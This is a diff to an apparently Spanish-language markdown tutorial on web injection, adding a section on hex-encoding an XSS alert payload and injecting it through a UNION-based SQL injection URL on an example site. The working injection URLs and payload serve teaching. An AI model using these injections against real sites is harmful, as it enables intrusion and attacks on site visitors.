@@ -16,6 +16,7 @@
  
  * [Pasar de sql inyection a xss inyection](#Pasar-de-sql-inyection-a-xss-inyection)
     * [¿Qué es una inyección xss?](#¿Qué-es-una-inyección-xss?)
+    * [Usando hex para esconder payloads](#Usando-hex-para-esconder-payloads)
  
 
 
@@ -288,4 +289,49 @@ Ahora que hemos visto como hacer un "ataque" de inyección sql, vamos a pasar de
 
 ### ¿Qué es una inyección xss?
 
-Este "ataque" consiste en inyectar código malicioso en páginas web benignas. El atacante inyecta código desde el lado del cliente, de forma que por una mala configuración de la página web, este código se muestre a otros usuarios
+Este "ataque" consiste en inyectar código malicioso en páginas web benignas. El atacante inyecta código desde el lado del cliente, de forma que por una mala configuración de la página web, este código se muestre a otros usuarios.
+
+### Usando hex para esconder payloads
+
+El sistema hexadecimal es un método de numeración posicional que utiliza como base el número 16 (Base-16), es decir, que existen 16 símbolos de dígitos posible.
+
+Sus números están representados por los 10 primeros dígitos de la numeración decimal y el intervalo del número 10 al número 15 se representa por las letras del alfabeto: A, B, C, D, E y F.
+
+Este es el método con el cual vamos a inyectar xss dentro de una vulnerabilidad sql, retomando el ejemplo de la pagina vulnerable nos quedaria algo así:
+
+De igual manera, vamos a hacer uso de la columna vulnerable, en este caso recordemos que la columna `5` es vulnerable.
+
+Para convertir cadenas a hex hay muchas herramientas y muchas páginas que nos permiten hacer eso, una de ellas es esta:
+
+https://www.convertstring.com/es/EncodeDecode/HexEncode
+
+
+un payload de inyección xss muy basico es el siguiente:
+
+`<script>alert(1)</script>` 
+
+en hex nos queda asi:
+
+`3C7363726970743E616C6572742831293C2F7363726970743E`
+
+y al inyectar de esta manera:
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
+```
+Nos muestra:
+
+`un error`
+
+por qué?? bueno, la página nos muestra el error ya que no puede leer la cadena en hex asi como esta, para que lo lea de manera correcta tenemos que agregar `0x` en el inicio de la cadena convertida en hex, de esta manera le estamos diciendo a la pagina que queremos que por medio de esa columna vulnerable nos ejecute esa cadena en `hex`, así:
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,0x3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
+```
+Nos muestra:
+
+`una alerta`
+
+Listo, de esta manera estamos pasando a una inyección xss dentro de una inyección sql.
+
+
